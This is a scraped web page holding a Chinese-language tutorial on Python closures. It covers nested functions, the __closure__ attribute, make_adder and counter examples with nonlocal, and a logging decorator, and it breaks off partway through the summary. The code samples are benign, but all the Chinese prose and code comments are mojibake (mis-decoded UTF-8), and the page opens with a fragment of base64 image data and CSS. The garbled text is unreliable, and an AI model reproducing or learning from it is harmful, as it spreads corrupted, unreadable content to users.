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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>å¼•è¨€ï¼š
é—­åŒ…æ˜¯ Python å‡½æ•°å¼ç¼–ç¨‹ä¸­æå…·ç‰¹è‰²çš„è¿›é˜¶ç‰¹æ€§ï¼Œå®ƒæ—¢ä¸æ˜¯åŸºç¡€è¯­æ³•ï¼Œä¹Ÿä¸æ˜¯å¿…å¤‡å·¥å…·ï¼Œå´èƒ½åœ¨ç‰¹å®šåœºæ™¯ä¸‹å®ç°ä¼˜é›…çš„çŠ¶æ€å°è£… â€”â€” æ— éœ€ç±»çš„å¤æ‚ç»“æ„ï¼Œä»…é€šè¿‡å‡½æ•°å°±èƒ½ä¿ç•™å˜é‡çš„ä¸Šä¸‹æ–‡çŠ¶æ€ã€‚æœ¬æ–‡èšç„¦<strong>é—­åŒ…</strong>è¿™ä¸€æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼Œä»æ ¸å¿ƒæ¦‚å¿µã€å®ç°æ¡ä»¶åˆ°å®æˆ˜åœºæ™¯ï¼Œå¸¦ä½ å½»åº•æŒæ¡è¿™ä¸€ Python è¿›é˜¶æŠ€èƒ½ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€é—­åŒ…çš„æ ¸å¿ƒæ¦‚å¿µ</h2>
<h3 data-id="heading-1">1. é—­åŒ…çš„å®šä¹‰</h3>
<p>é—­åŒ…ï¼ˆClosureï¼‰æœ¬è´¨æ˜¯<strong>åµŒå¥—å‡½æ•°</strong>çš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼šå†…å±‚å‡½æ•°å¼•ç”¨äº†å¤–å±‚å‡½æ•°çš„å˜é‡ï¼ˆéå…¨å±€å˜é‡ï¼‰ï¼Œä¸”å¤–å±‚å‡½æ•°è¿”å›å†…å±‚å‡½æ•°æœ¬èº«ã€‚ç®€å•æ¥è¯´ï¼Œé—­åŒ…æ»¡è¶³ä¸‰ä¸ªæ ¸å¿ƒæ¡ä»¶ï¼š</p>
<ol>
<li>å­˜åœ¨åµŒå¥—å‡½æ•°ï¼ˆå¤–å±‚å‡½æ•° + å†…å±‚å‡½æ•°ï¼‰ï¼›</li>
<li>å†…å±‚å‡½æ•°å¼•ç”¨äº†å¤–å±‚å‡½æ•°çš„å˜é‡ï¼ˆè‡ªç”±å˜é‡ï¼‰ï¼›</li>
<li>å¤–å±‚å‡½æ•°è¿”å›å†…å±‚å‡½æ•°ï¼ˆè€Œéå†…å±‚å‡½æ•°çš„æ‰§è¡Œç»“æœï¼‰ã€‚</li>
</ol>
<p>é—­åŒ…çš„æ ¸å¿ƒä»·å€¼æ˜¯ï¼š<strong>ä¿ç•™å¤–å±‚å‡½æ•°çš„å˜é‡çŠ¶æ€</strong>â€”â€” å³ä½¿å¤–å±‚å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œå…¶å˜é‡ä¹Ÿä¸ä¼šè¢«åƒåœ¾å›æ”¶ï¼Œè€Œæ˜¯è¢«å†…å±‚å‡½æ•° â€œè®°ä½â€ å¹¶æŒç»­ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-2">2. é€šä¿—ç†è§£</h3>
<p>å¯ä»¥æŠŠé—­åŒ…æ¯”ä½œ â€œå¸¦è®°å¿†çš„å‡½æ•°â€ï¼šå¤–å±‚å‡½æ•°æ˜¯ â€œè®°å¿†ç”Ÿæˆå™¨â€ï¼Œå®šä¹‰äº†è¦è®°ä½çš„å˜é‡ï¼›å†…å±‚å‡½æ•°æ˜¯ â€œæ‰§è¡Œå™¨â€ï¼Œæ—¢èƒ½æ‰§è¡Œé€»è¾‘ï¼Œåˆèƒ½è®¿é—®è¿™äº› â€œè®°å¿†â€ï¼›è¿”å›å†…å±‚å‡½æ•°åˆ™æ˜¯æŠŠ â€œå¸¦è®°å¿†çš„æ‰§è¡Œå™¨â€ æ‹¿å‡ºæ¥å•ç‹¬ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-3">äºŒã€é—­åŒ…çš„åŸºç¡€å®ç°</h2>
<h3 data-id="heading-4">1. æœ€ç®€é—­åŒ…ç¤ºä¾‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¤–å±‚å‡½æ•°ï¼šå®šä¹‰è¦å°è£…çš„çŠ¶æ€ï¼ˆå˜é‡ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">outer_func</span>(<span class="hljs-params">msg</span>):
    <span class="hljs-comment"># è‡ªç”±å˜é‡ï¼šè¢«å†…å±‚å‡½æ•°å¼•ç”¨çš„å¤–å±‚å˜é‡</span>
    message = msg

    <span class="hljs-comment"># å†…å±‚å‡½æ•°ï¼šä½¿ç”¨å¤–å±‚å˜é‡ï¼Œæ— ç‹¬ç«‹çš„åŒåå˜é‡</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner_func</span>():
        <span class="hljs-comment"># å¼•ç”¨å¤–å±‚å‡½æ•°çš„messageå˜é‡</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é—­åŒ…è®°ä½çš„ä¿¡æ¯ï¼š<span class="hljs-subst">{message}</span>"</span>)
    
    <span class="hljs-comment"># å¤–å±‚å‡½æ•°è¿”å›å†…å±‚å‡½æ•°ï¼ˆä¸æ‰§è¡Œï¼Œä»…è¿”å›å‡½æ•°å¯¹è±¡ï¼‰</span>
    <span class="hljs-keyword">return</span> inner_func

<span class="hljs-comment"># è°ƒç”¨å¤–å±‚å‡½æ•°ï¼Œå¾—åˆ°å†…å±‚å‡½æ•°å¯¹è±¡ï¼ˆæ­¤æ—¶outer_funcå·²æ‰§è¡Œå®Œæ¯•ï¼‰</span>
func = outer_func(<span class="hljs-string">"Hello, Closure!"</span>)
<span class="hljs-comment"># è°ƒç”¨å†…å±‚å‡½æ•°ï¼Œä»èƒ½è®¿é—®å¤–å±‚çš„messageå˜é‡</span>
func()  <span class="hljs-comment"># è¾“å‡ºï¼šé—­åŒ…è®°ä½çš„ä¿¡æ¯ï¼šHello, Closure!</span>

<span class="hljs-comment"># å†æ¬¡åˆ›å»ºæ–°çš„é—­åŒ…å®ä¾‹ï¼ŒçŠ¶æ€ç‹¬ç«‹</span>
func2 = outer_func(<span class="hljs-string">"Python is awesome!"</span>)
func2()  <span class="hljs-comment"># è¾“å‡ºï¼šé—­åŒ…è®°ä½çš„ä¿¡æ¯ï¼šPython is awesome!</span>
func()   <span class="hljs-comment"># è¾“å‡ºï¼šé—­åŒ…è®°ä½çš„ä¿¡æ¯ï¼šHello, Closure!ï¼ˆåŸæœ‰çŠ¶æ€ä¸å—å½±å“ï¼‰</span>
</code></pre>
<h3 data-id="heading-5">2. é—­åŒ…çš„å…³é”®éªŒè¯</h3>
<p>é€šè¿‡Â <code>__closure__</code>Â å±æ€§å¯éªŒè¯æ˜¯å¦ä¸ºé—­åŒ…ï¼šé—­åŒ…å‡½æ•°çš„Â <code>__closure__</code>Â ä¼šè¿”å›åŒ…å«è‡ªç”±å˜é‡çš„å…ƒç»„ï¼Œæ™®é€šå‡½æ•°åˆ™è¿”å›Â <code>None</code>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éªŒè¯é—­åŒ…å±æ€§</span>
<span class="hljs-built_in">print</span>(func.__closure__)  <span class="hljs-comment"># è¾“å‡ºï¼š(&lt;cell at 0x...: str object at 0x...&gt;,)</span>
<span class="hljs-built_in">print</span>(func.__closure__[<span class="hljs-number">0</span>].cell_contents)  <span class="hljs-comment"># è¾“å‡ºï¼šHello, Closure!</span>

<span class="hljs-comment"># æ™®é€šå‡½æ•°ï¼ˆæ— é—­åŒ…ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">normal_func</span>():
    a = <span class="hljs-number">1</span>
    <span class="hljs-built_in">print</span>(a)

normal = normal_func
<span class="hljs-built_in">print</span>(normal.__closure__)  <span class="hljs-comment"># è¾“å‡ºï¼šNone</span>
</code></pre>
<h2 data-id="heading-6">ä¸‰ã€é—­åŒ…çš„è¿›é˜¶ç”¨æ³•</h2>
<h3 data-id="heading-7">1. å¸¦å‚æ•°çš„é—­åŒ…</h3>
<p>å†…å±‚å‡½æ•°å¯æ¥æ”¶å‚æ•°ï¼Œç»“åˆå¤–å±‚å˜é‡å®ç°æ›´çµæ´»çš„é€»è¾‘ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éœ€æ±‚ï¼šåˆ›å»ºåŠ æ³•å™¨ï¼Œå›ºå®šä¸€ä¸ªåŠ æ•°ï¼ŒåŠ¨æ€ä¼ å…¥å¦ä¸€ä¸ªåŠ æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">make_adder</span>(<span class="hljs-params">fixed_num</span>):
    <span class="hljs-comment"># å¤–å±‚å˜é‡ï¼šå›ºå®šçš„åŠ æ•°</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">adder</span>(<span class="hljs-params">dynamic_num</span>):
        <span class="hljs-comment"># å†…å±‚å‡½æ•°æ¥æ”¶åŠ¨æ€å‚æ•°ï¼Œç»“åˆå¤–å±‚å˜é‡è®¡ç®—</span>
        <span class="hljs-keyword">return</span> fixed_num + dynamic_num
    <span class="hljs-keyword">return</span> adder

<span class="hljs-comment"># åˆ›å»ºåŠ 5çš„åŠ æ³•å™¨</span>
add5 = make_adder(<span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(add5(<span class="hljs-number">3</span>))  <span class="hljs-comment"># è¾“å‡ºï¼š8ï¼ˆ5+3ï¼‰</span>
<span class="hljs-built_in">print</span>(add5(<span class="hljs-number">10</span>)) <span class="hljs-comment"># è¾“å‡ºï¼š15ï¼ˆ5+10ï¼‰</span>

<span class="hljs-comment"># åˆ›å»ºåŠ 100çš„åŠ æ³•å™¨</span>
add100 = make_adder(<span class="hljs-number">100</span>)
<span class="hljs-built_in">print</span>(add100(<span class="hljs-number">20</span>))  <span class="hljs-comment"># è¾“å‡ºï¼š120</span>
</code></pre>
<h3 data-id="heading-8">2. é—­åŒ…å®ç°çŠ¶æ€ç´¯åŠ </h3>
<p>é—­åŒ…å¯ä¿ç•™å˜é‡çš„æ›´æ–°çŠ¶æ€ï¼Œæ›¿ä»£ç®€å•çš„ç±»å®ç°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éœ€æ±‚ï¼šå®ç°è®¡æ•°å™¨ï¼Œæ¯æ¬¡è°ƒç”¨è‡ªå¢1</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">counter</span>():
    <span class="hljs-comment"># ç§æœ‰çŠ¶æ€ï¼šä»…é—­åŒ…å¯è®¿é—®ï¼Œå¤–éƒ¨æ— æ³•ç›´æ¥ä¿®æ”¹</span>
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">increment</span>():
        <span class="hljs-comment"># å£°æ˜ä¿®æ”¹å¤–å±‚å˜é‡ï¼ˆnonlocalå…³é”®å­—ï¼‰</span>
        <span class="hljs-keyword">nonlocal</span> count
        count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> count
    <span class="hljs-keyword">return</span> increment

<span class="hljs-comment"># åˆ›å»ºè®¡æ•°å™¨å®ä¾‹</span>
cnt = counter()
<span class="hljs-built_in">print</span>(cnt())  <span class="hljs-comment"># è¾“å‡ºï¼š1</span>
<span class="hljs-built_in">print</span>(cnt())  <span class="hljs-comment"># è¾“å‡ºï¼š2</span>
<span class="hljs-built_in">print</span>(cnt())  <span class="hljs-comment"># è¾“å‡ºï¼š3</span>

<span class="hljs-comment"># æ–°è®¡æ•°å™¨å®ä¾‹ï¼ŒçŠ¶æ€ç‹¬ç«‹</span>
cnt2 = counter()
<span class="hljs-built_in">print</span>(cnt2())  <span class="hljs-comment"># è¾“å‡ºï¼š1</span>
<span class="hljs-built_in">print</span>(cnt())   <span class="hljs-comment"># è¾“å‡ºï¼š4ï¼ˆåŸæœ‰è®¡æ•°å™¨ä¸å—å½±å“ï¼‰</span>
</code></pre>
<p><strong>å…³é”®è¯´æ˜</strong>ï¼š<code>nonlocal</code>Â å…³é”®å­—ç”¨äºå£°æ˜å†…å±‚å‡½æ•°è¦ä¿®æ”¹çš„æ˜¯å¤–å±‚å‡½æ•°çš„å˜é‡ï¼ˆè€Œéåˆ›å»ºå±€éƒ¨å˜é‡ï¼‰ï¼Œè‹¥æ— æ­¤å£°æ˜ï¼Œç›´æ¥ä¿®æ”¹Â <code>count</code>Â ä¼šæŠ¥Â <code>UnboundLocalError</code>ã€‚</p>
<h2 data-id="heading-9">å››ã€é—­åŒ…çš„å…¸å‹åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-10">1. ç®€åŒ–ç®€å•çŠ¶æ€ç®¡ç†</h3>
<p>æ— éœ€å®šä¹‰ç±»ï¼Œå³å¯å®ç°è½»é‡çº§çš„çŠ¶æ€å°è£…ï¼Œæ¯”ç±»æ›´ç®€æ´ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯¹æ¯”ï¼šé—­åŒ… vs ç±»å®ç°è®¡æ•°å™¨</span>
<span class="hljs-comment"># é—­åŒ…å®ç°ï¼ˆç®€æ´ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">closure_counter</span>():
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inc</span>():
        <span class="hljs-keyword">nonlocal</span> count
        count +=<span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> count
    <span class="hljs-keyword">return</span> inc

<span class="hljs-comment"># ç±»å®ç°ï¼ˆç¹çï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassCounter</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inc</span>(<span class="hljs-params">self</span>):
        self.count +=<span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> self.count

<span class="hljs-comment"># ä½¿ç”¨æ•ˆæœä¸€è‡´ï¼Œä½†é—­åŒ…ä»£ç é‡æ›´å°‘</span>
cc = ClassCounter()
<span class="hljs-built_in">print</span>(cc.inc())  <span class="hljs-comment"># 1</span>
clc = closure_counter()
<span class="hljs-built_in">print</span>(clc())     <span class="hljs-comment"># 1</span>
</code></pre>
<h3 data-id="heading-11">2. è£…é¥°å™¨çš„åº•å±‚æ”¯æ’‘</h3>
<p>Python è£…é¥°å™¨çš„æ ¸å¿ƒå®ç°ä¾èµ–é—­åŒ… â€”â€” è£…é¥°å™¨å‡½æ•°æ¥æ”¶è¢«è£…é¥°å‡½æ•°ä½œä¸ºå¤–å±‚å˜é‡ï¼Œå†…å±‚å‡½æ•°åŒ…è£…é€»è¾‘å¹¶è¿”å›ï¼Œæœ¬è´¨å°±æ˜¯é—­åŒ…çš„åº”ç”¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸºäºé—­åŒ…å®ç°æ—¥å¿—è£…é¥°å™¨</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">log_decorator</span>(<span class="hljs-params">func</span>):
    <span class="hljs-comment"># å¤–å±‚å˜é‡ï¼šè¢«è£…é¥°çš„å‡½æ•°</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ‰§è¡Œå‡½æ•°ï¼š<span class="hljs-subst">{func.__name__}</span>"</span>)
        result = func(*args, **kwargs)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‡½æ•°æ‰§è¡Œå®Œæˆï¼Œç»“æœï¼š<span class="hljs-subst">{result}</span>"</span>)
        <span class="hljs-keyword">return</span> result
    <span class="hljs-comment"># è¿”å›å†…å±‚å‡½æ•°ï¼ˆé—­åŒ…ï¼‰</span>
    <span class="hljs-keyword">return</span> wrapper

<span class="hljs-meta">@log_decorator</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">return</span> a + b

add(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># æ‰§è¡Œå‡½æ•°ï¼šadd</span>
<span class="hljs-comment"># å‡½æ•°æ‰§è¡Œå®Œæˆï¼Œç»“æœï¼š5</span>
</code></pre>
<h3 data-id="heading-12">3. å»¶è¿Ÿæ‰§è¡Œé€»è¾‘</h3>
<p>é—­åŒ…å¯å°†å‚æ•°å’Œé€»è¾‘å°è£…ï¼Œå»¶è¿Ÿåˆ°éœ€è¦æ—¶æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éœ€æ±‚ï¼šæ‰¹é‡åˆ›å»ºè®¡ç®—ä»»åŠ¡ï¼ŒæŒ‰éœ€æ‰§è¡Œ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_calc_task</span>(<span class="hljs-params">operator, num1</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">num2</span>):
        <span class="hljs-keyword">if</span> operator == <span class="hljs-string">"+"</span>:
            <span class="hljs-keyword">return</span> num1 + num2
        <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">"*"</span>:
            <span class="hljs-keyword">return</span> num1 * num2
    <span class="hljs-keyword">return</span> calc

<span class="hljs-comment"># åˆ›å»ºä¸¤ä¸ªè®¡ç®—ä»»åŠ¡</span>
add_task = create_calc_task(<span class="hljs-string">"+"</span>, <span class="hljs-number">10</span>)
mul_task = create_calc_task(<span class="hljs-string">"*"</span>, <span class="hljs-number">10</span>)

<span class="hljs-comment"># å»¶è¿Ÿæ‰§è¡Œï¼ˆåç»­ä»»æ„æ—¶æœºè°ƒç”¨ï¼‰</span>
<span class="hljs-built_in">print</span>(add_task(<span class="hljs-number">5</span>))  <span class="hljs-comment"># 15</span>
<span class="hljs-built_in">print</span>(mul_task(<span class="hljs-number">5</span>))  <span class="hljs-comment"># 50</span>
</code></pre>
<h2 data-id="heading-13">äº”ã€é—­åŒ…çš„æ³¨æ„äº‹é¡¹</h2>
<ol>
<li>
<p><strong>è‡ªç”±å˜é‡çš„ä¿®æ”¹</strong>ï¼šå†…å±‚å‡½æ•°ä¿®æ”¹å¤–å±‚å˜é‡æ—¶ï¼Œå¿…é¡»ç”¨Â <code>nonlocal</code>Â å£°æ˜ï¼ˆå…¨å±€å˜é‡ç”¨Â <code>global</code>ï¼‰ï¼Œå¦åˆ™ä¼šè§†ä¸ºåˆ›å»ºå±€éƒ¨å˜é‡ï¼›</p>
</li>
<li>
<p><strong>å†…å­˜å ç”¨</strong>ï¼šé—­åŒ…ä¼šä¿ç•™å¤–å±‚å˜é‡çš„å¼•ç”¨ï¼Œè‹¥å¤§é‡åˆ›å»ºé—­åŒ…å®ä¾‹ä¸”é•¿æœŸä¸é‡Šæ”¾ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ï¼Œéœ€åŠæ—¶æ¸…ç†ï¼›</p>
</li>
<li>
<p><strong>å¯è¯»æ€§æƒè¡¡</strong>ï¼šç®€å•é€»è¾‘ç”¨é—­åŒ…æ›´ç®€æ´ï¼Œå¤æ‚çŠ¶æ€ç®¡ç†å»ºè®®ç”¨ç±»ï¼ˆæ›´æ˜“ç»´æŠ¤ï¼‰ï¼›</p>
</li>
<li>
<p><strong>å˜é‡ä½œç”¨åŸŸ</strong>ï¼šé—­åŒ…å¼•ç”¨çš„æ˜¯å˜é‡çš„å¼•ç”¨ï¼Œè€Œéå˜é‡çš„å¿«ç…§ â€”â€” è‹¥å¤–å±‚å˜é‡åç»­è¢«ä¿®æ”¹ï¼Œé—­åŒ…è·å–çš„æ˜¯æœ€æ–°å€¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>():
    x = <span class="hljs-number">1</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():
        <span class="hljs-built_in">print</span>(x)
    x = <span class="hljs-number">2</span>  <span class="hljs-comment"># å¤–å±‚å˜é‡è¢«ä¿®æ”¹</span>
    <span class="hljs-keyword">return</span> inner

f = outer()
f()  <span class="hljs-comment"># è¾“å‡ºï¼š2ï¼ˆè€Œé1ï¼‰</span>
</code></pre>
</li>
</ol>
<h2 data-id="heading-14">æ€»ç»“</h2>
<ol>
<li>é—­åŒ…æ˜¯æ»¡è¶³ â€œåµŒå¥—å‡½æ•° + å¼•ç”¨å¤–å±‚å˜é‡ + è¿”å›å†…å±‚å‡½æ•°â€ ä¸‰ä¸ªæ¡ä»¶çš„ç‰¹æ®Šå‡½æ•°ï¼Œæ ¸å¿ƒèƒ½åŠ›æ˜¯<strong>å°è£…å¹¶ä¿ç•™å¤–å±‚å‡½æ•°çš„å˜é‡çŠ¶æ€</strong>ï¼›</li>
<li><code>nonlocal</code>Â å…³é”®å­—æ˜¯ä¿®æ”¹å¤–å±‚å‡½æ•°å˜é‡çš„å…³é”®ï¼Œ<code>__closure__</code>Â å±æ€§å¯éªŒè¯æ˜¯å¦ä¸ºé—­åŒ…ï¼›</li>
